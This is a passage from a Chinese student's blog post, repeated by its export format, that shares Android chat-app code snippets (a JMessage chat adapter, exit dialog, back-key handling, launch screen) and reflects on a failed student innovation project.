JMessageClient.getMyInfo().getUserName()) &#123;</span><br><span class=\"line\">            holder.right_layout.setVisibility(View.VISIBLE);</span><br><span class=\"line\">            holder.left_layout.setVisibility(View.GONE);</span><br><span class=\"line\">            holder.myname.setText(message.getFromUser().getUserName());</span><br><span class=\"line\">            <span class=\"comment\">//holder.friend_head.setImageResource(R.mipmap.friend_head);</span></span><br><span class=\"line\">            TimeFormat timeFormat = <span class=\"keyword\">new</span> TimeFormat(mContext, message.getCreateTime());</span><br><span class=\"line\">            holder.right_chatting_time.setText(timeFormat.getTime());</span><br><span class=\"line\">            TextContent textContent = (TextContent) message.getContent();</span><br><span class=\"line\">            holder.right_chatting_message.setText(textContent.getText());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            holder.left_layout.setVisibility(View.VISIBLE);</span><br><span class=\"line\">            holder.right_layout.setVisibility(View.GONE);</span><br><span class=\"line\">            holder.friend_username.setText(message.getFromUser().getUserName());</span><br><span class=\"line\">            <span class=\"comment\">//holder.friend_head.setImageResource(R.mipmap.friend_head);</span></span><br><span class=\"line\">            TimeFormat timeFormat = <span class=\"keyword\">new</span> TimeFormat(mContext,message.getCreateTime());</span><br><span class=\"line\">            holder.left_chatting_time.setText(timeFormat.getTime());</span><br><span class=\"line\">            TextContent textContent = (TextContent) message.getContent();</span><br><span class=\"line\">            holder.left_chatting_message.setText(textContent.getText());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> view;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">incrementStartPosition</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        ++mStart;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">clearMsgList</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        chatting_list.clear();</span><br><span class=\"line\">        mStart = <span class=\"number\">0</span>;</span><br><span class=\"line\">        notifyDataSetChanged();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> Message <span class=\"title\">getLastMsg</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (chatting_list.size() &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> chatting_list.get(chatting_list.size() - <span class=\"number\">1</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">addMsgToList</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        chatting_list.clear();</span><br><span class=\"line\">        mConversation = JMessageClient.getSingleConversation(USERNAME);</span><br><span class=\"line\">        chatting_list = mConversation.getMessagesFromNewest(<span class=\"number\">0</span>,mOffset);</span><br><span class=\"line\">        Collections.reverse(chatting_list);</span><br><span class=\"line\">        <span class=\"comment\">//chatting_list.add(msg);</span></span><br><span class=\"line\">        <span class=\"comment\">//incrementStartPosition();</span></span><br><span class=\"line\">        notifyDataSetChanged();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ViewHolder</span> </span>&#123;</span><br><span class=\"line\">        RelativeLayout left_layout;</span><br><span class=\"line\">        TextView friend_username;</span><br><span class=\"line\">        TextView left_chatting_message;</span><br><span class=\"line\">        TextView left_chatting_time;</span><br><span class=\"line\">        ImageView friend_head;</span><br><span class=\"line\">        RelativeLayout right_layout;</span><br><span class=\"line\">        TextView myname;</span><br><span class=\"line\">        TextView right_chatting_message;</span><br><span class=\"line\">        TextView right_chatting_time;</span><br><span class=\"line\">        ImageView my_head;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>使用自定义Adapter</strong><br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">friendListAdapter = <span class=\"keyword\">new</span> FriendListAdapter(Friend_List.<span class=\"keyword\">this</span>, friendlist);</span><br><span class=\"line\">                        Friend_List.setAdapter(friendListAdapter);</span><br></pre></td></tr></table></figure></p>\n<p><strong>3.退出确认Dialog</strong><br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">exitActivity</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">new</span> AlertDialog.Builder(<span class=\"keyword\">this</span>).setTitle(<span class=\"string\">\"确认退出吗？\"</span>)</span><br><span class=\"line\">                .setIcon(android.R.drawable.ic_dialog_info)</span><br><span class=\"line\">                .setPositiveButton(<span class=\"string\">\"确定\"</span>, <span class=\"keyword\">new</span> DialogInterface.OnClickListener() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"meta\">@Override</span></span><br><span class=\"line\">                    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">onClick</span><span class=\"params\">(DialogInterface dialog, <span class=\"keyword\">int</span> which)</span> </span>&#123;</span><br><span class=\"line\">                        <span class=\"comment\">// 点击“确认”后的操作</span></span><br><span class=\"line\">                        JMessageClient.logout();</span><br><span class=\"line\">                        Friend_List.<span class=\"keyword\">this</span>.finish();</span><br><span class=\"line\"></span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;)</span><br><span class=\"line\">                .setNegativeButton(<span class=\"string\">\"返回\"</span>, <span class=\"keyword\">new</span> DialogInterface.OnClickListener() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"meta\">@Override</span></span><br><span class=\"line\">                    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">onClick</span><span class=\"params\">(DialogInterface dialog, <span class=\"keyword\">int</span> which)</span> </span>&#123;</span><br><span class=\"line\">                        <span class=\"comment\">// 点击“返回”后的操作,这里不设置没有任何操作</span></span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;).show();</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>4.不结束软件退出</strong><br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">boolean</span> <span class=\"title\">onKeyDown</span><span class=\"params\">(<span class=\"keyword\">int</span> keyCode, KeyEvent event)</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (keyCode == KeyEvent.KEYCODE_BACK) &#123;</span><br><span class=\"line\">            Intent home = <span class=\"keyword\">new</span> Intent(Intent.ACTION_MAIN);</span><br><span class=\"line\">            home.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);</span><br><span class=\"line\">            home.addCategory(Intent.CATEGORY_HOME);</span><br><span class=\"line\">            startActivity(home);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">super</span>.onKeyDown(keyCode, event);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>5.为软件插入启动广告</strong><br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">LaunchActivity</span> <span class=\"keyword\">extends</span> <span class=\"title\">AppCompatActivity</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">onCreate</span><span class=\"params\">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>.onCreate(savedInstanceState);</span><br><span class=\"line\">        <span class=\"comment\">//加载启动界面</span></span><br><span class=\"line\">        setContentView(R.layout.activity_launch);</span><br><span class=\"line\">                <span class=\"comment\">//当计时结束时，调至主界面</span></span><br><span class=\"line\">        Handler handler = <span class=\"keyword\">new</span> Handler();</span><br><span class=\"line\">        handler.postDelayed(<span class=\"keyword\">new</span> Runnable() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">                startActivity(<span class=\"keyword\">new</span> Intent(LaunchActivity.<span class=\"keyword\">this</span>, MainActivity.class));</span><br><span class=\"line\">                LaunchActivity.<span class=\"keyword\">this</span>.finish();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;, <span class=\"number\">3000</span>);   <span class=\"comment\">//界面停留时间</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>更多内容在github上</strong></p>\n<h1 id=\"目前学习进度\"><a href=\"#目前学习进度\" class=\"headerlink\" title=\"目前学习进度\"></a>目前学习进度</h1><p><strong>现在已经将之前的电脑作为了服务器，目前正在熟悉网站开发一整套流程。目标是熟悉使用php大法，css和javascript,数据库这个东西讲道理我不想接触，但是没办法，这一关必须得过。虽然有xml，但是xml并不是合理的选择,所以继续学呗。</strong><br><strong>最近在一些新闻上看到android可能有新的发展方向，可能会逐渐走向闭源。怎么说呢，即使google是这样想的，但是这肯定是一个比较漫长的过程，不管怎么说，google不会放弃中国这个市场的，因此也不会拒绝中国的开发人员，因此，学习Android仍然是可行的，最近从图书馆借了一本书，准备系统性的学习一下Android，结束以前的野路子。</strong></p>\n<h1 id=\"对于国创失败的感悟\"><a href=\"#对于国创失败的感悟\" class=\"headerlink\" title=\"对于国创失败的感悟\"></a>对于国创失败的感悟</h1><p><strong>很不幸，我的第一次国创之路失败了，对此做个总结。</strong><br><strong>首先，在找队友的路上，我就走得很不顺。找不到可靠的队友，最后无奈自己来做队长，基本上所有的事情都由我一手独揽。原本准备让一个队友写计划书，然而到了要交计划书的时候他告诉我他没有电脑，写不出来，所以退出。在最后一两天临时找了一个学弟凑人数，然后自己一个人忙着所有的事情。其次，在方向上出现问题。之前一直找不到方向，然后找了一个高中同学聊了半天，决定了一个方向，然而由于我迫切地想要接入小米的接口，使得我计划的整个项目没有创新点，这也成了国创失败的主要原因。归咎下来，主要还是因为我太一意孤行了，之前迫切想要接入小米接口，队友也不好阻止我，就放任我走向一个死胡同。</strong><br><strong>不知道是什么原因，一直没有找到可以一起学习、一起做项目的同伴，在一个人瞎摸索的路上举步维艰，时不时地出现迷茫的情况，不知道自己想要学什么，不知道自己想要做出个什么项目。总是在一个人的路上走走停停。所以，现在真的想寻求一个可靠的同伴一起学习、一起做项目。</strong></p>\n<h3 id=\"新的信仰\"><a href=\"#新的信仰\" class=\"headerlink\" title=\"新的信仰\"></a>新的信仰</h3><p><strong>国创答辩刚刚结束，学院就来了一个讲座，dota女神前来宣讲。讲道理，女神真的很优秀，特别喜欢她信仰的那句话</strong></p>\n<p><strong>：所有事情到最后都将是好的结局，如果不好，那么就不是结局.<br>：Everything gonna be fine in the end,if it’s not fine,it’s not the end.</strong></p>\n","excerpt":"<p><strong>好久没有更新博客了，有很多原因。一方面，前段时间事情太多，大概花了一个月来写一个android聊天软件来参加，学校的比赛，虽然写好了，也还像个样子，但在最后答辩的时候选择了放弃。因为国创答辩失败了，恰好那个比赛的答辩和国创答辩同时进行的，所有带着沮丧的心情离开了。另一方面，换了一台电脑工作，而我的博客后台在原来的电脑上，我一直想将它迁移到新的电脑上，然而一直没有成功。因此，大概有托更了3个月的博客，现在静下心来总结一下最近的学习。</strong></p>","more":"<h1 id=\"Android项目经验\"><a href=\"#Android项目经验\" class=\"headerlink\" title=\"Android项目经验\"></a>Android项目经验</h1><p><strong>1.Toolbar上实现返回按钮</strong><br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">backButton.setOnClickListener(<span class=\"keyword\">new</span> View.OnClickListener() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">onClick</span><span class=\"params\">(View v)</span> </span>&#123;</span><br><span class=\"line\">                onBackPressed();    <span class=\"comment\">//实现返回功能</span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">onBackPressed</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// TODO Auto-generated method stub</span></span><br><span class=\"line\">        <span class=\"keyword\">super</span>.onBackPressed();</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p><strong>2.listview自定义Adapter</strong><br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Chatting_Adapter</span> <span class=\"keyword\">extends</span> <span class=\"title\">BaseAdapter</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> PAGE_MESSAGE_COUNT = <span class=\"number\">30</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span>  <span class=\"keyword\">static</span> String USERNAME = <span class=\"string\">\"com.example.username\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span>  <span class=\"keyword\">static</span> String MYNAME = <span class=\"string\">\"com.example.myname\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> List&lt;cn.jpush.im.android.api.model.Message&gt; chatting_list;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> LayoutInflater myInflater;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Context mContext;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> mStart;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> mOffset = PAGE_MESSAGE_COUNT;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> Conversation mConversation;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">Chatting_Adapter</span><span class=\"params\">(Context context, String UserName, List&lt;Message&gt; chatting_list)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.USERNAME = UserName;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.mContext = context;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.mStart = mOffset;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.chatting_list = chatting_list;</span><br><span class=\"line\">        myInflater = LayoutInflater.from(context);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//返回数据集长度</span></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">getCount</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> chatting_list.size();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> Object <span class=\"title\">getItem</span><span class=\"params\">(<span class=\"keyword\">int</span> position)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> chatting_list.get(position);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">long</span> <span class=\"title\">getItemId</span><span class=\"params\">(<span class=\"keyword\">int</span> position)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> position;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">setData</span><span class=\"params\">(List&lt;Message&gt; chatting_list)</span></span><br><span class=\"line\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">// TODO Auto-generated method stub</span></span><br><span class=\"line\">        <span class=\"keyword\">this</span>.chatting_list = chatting_list;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> View <span class=\"title\">getView</span><span class=\"params\">(<span class=\"keyword\">final</span> <span class=\"keyword\">int</span> position, View view, ViewGroup viewGroup)</span> </span>&#123;</span><br><span class=\"line\">        Message message = chatting_list.get(position);</span><br><span class=\"line\">        ViewHolder holder;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(view == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">            view = myInflater.inflate(R.layout.chat_text_ui, viewGroup, <span class=\"keyword\">false</span>);</span><br><span class=\"line\">            holder = <span class=\"keyword\">new</span> ViewHolder();</span><br><span class=\"line\">            holder.left_layout = (RelativeLayout)view.findViewById(R.id.left_layout);</span><br><span class=\"line\">            holder.friend_username = (TextView)view.findViewById(R.id.left_tv_name);</span><br><span class=\"line\">            holder.friend_head = (ImageView)view.findViewById(R.id.left_iv_portrait);</span><br><span class=\"line\">            holder.left_chatting_message = (TextView)view.findViewById(R.id.left_tv_content);</span><br><span class=\"line\">            holder.left_chatting_time = (TextView)view.findViewById(R.id.left_tv_time);</span><br><span class=\"line\">            holder.right_layout = (RelativeLayout)view.findViewById(R.id.right_layout);</span><br><span class=\"line\">            holder.myname = (TextView)view.findViewById(R.id.right_tv_name);</span><br><span class=\"line\">            holder.my_head = (ImageView)view.findViewById(R.id.right_iv_portrait);</span><br><span class=\"line\">            holder.right_chatting_message = (TextView)view.findViewById(R.id.right_tv_content);</span><br><span class=\"line\">            holder.right_chatting_time = (TextView)view.findViewById(R.id.right_tv_time);</span><br><span class=\"line\"></span><br><span class=\"line\">            view.setTag(holder);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            holder = (ViewHolder)view.getTag();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (message.getFromUser().getUserName() == JMessageClient.getMyInfo().getUserName()) &#123;</span><br><span class=\"line\">            holder.right_layout.setVisibility(View.VISIBLE);</span><br><span class=\"line\">            holder.left_layout.setVisibility(View.GONE);</span><br><span class=\"line\">            holder.myname.setText(message.getFromUser().getUserName());</span><br><span class=\"line\">            <span class=\"comment\">//holder.friend_head.setImageResource(R.mipmap.friend_head);</span></span><br><span class=\"line\">            TimeFormat timeFormat = <span class=\"keyword\">new</span> TimeFormat(mContext, message.getCreateTime());</span><br><span class=\"line\">            holder.right_chatting_time.setText(timeFormat.getTime());</span><br><span class=\"line\">            TextContent textContent = (TextContent) message.getContent();</span><br><span class=\"line\">            holder.right_chatting_message.setText(textContent.getText());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            holder.left_layout.setVisibility(View.VISIBLE);</span><br><span class=\"line\">            holder.right_layout.setVisibility(View.GONE);</span><br><span class=\"line\">            holder.friend_username.setText(message.getFromUser().getUserName());</span><br><span class=\"line\">            <span class=\"comment\">//holder.friend_head.setImageResource(R.mipmap.friend_head);</span></span><br><span class=\"line\">            TimeFormat timeFormat = <span class=\"keyword\">new</span> TimeFormat(mContext,message.getCreateTime());</span><br><span class=\"line\">            holder.left_chatting_time.setText(timeFormat.getTime());</span><br><span class=\"line\">            TextContent textContent = (TextContent) message.getContent();</span><br><span class=\"line\">            holder.left_chatting_message.setText(textContent.getText());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> view;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">incrementStartPosition</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        ++mStart;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">clearMsgList</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        chatting_list.clear();</span><br><span class=\"line\">        mStart = <span class=\"number\">0</span>;</span><br><span class=\"line\">        notifyDataSetChanged();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> Message <span class=\"title\">getLastMsg</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (chatting_list.size() &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> chatting_list.get(chatting_list.size() - <span class=\"number\">1</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">addMsgToList</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        chatting_list.clear();</span><br><span class=\"line\">        mConversation = JMessageClient.getSingleConversation(USERNAME);</span><br><span class=\"line\">        chatting_list = mConversation.getMessagesFromNewest(<span class=\"number\">0</span>,mOffset);</span><br><span class=\"line\">        Collections.reverse(chatting_list);</span><br><span class=\"line\">        <span class=\"comment\">//chatting_list.add(msg);</span></span><br><span class=\"line\">        <span class=\"comment\">//incrementStartPosition();</span></span><br><span class=\"line\">        notifyDataSetChanged();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ViewHolder</span> </span>&#123;</span><br><span class=\"line\">        RelativeLayout left_layout;</span><br><span class=\"line\">        TextView friend_username;</span><br><span class=\"line\">        TextView left_chatting_message;</span><br><span class=\"line\">        TextView left_chatting_time;</span><br><span class=\"line\">        ImageView friend_head;</span><br><span class=\"line\">        RelativeLayout right_layout;</span><br><span class=\"line\">        TextView myname;</span><br><span class=\"line\">        TextView right_chatting_message;</span><br><span class=\"line\">        TextView right_chatting_time;</span><br><span class=\"line\">        ImageView my_head;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><strong>使用自定义Adapter</strong><br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">friendListAdapter = <span class=\"keyword\">new</span> 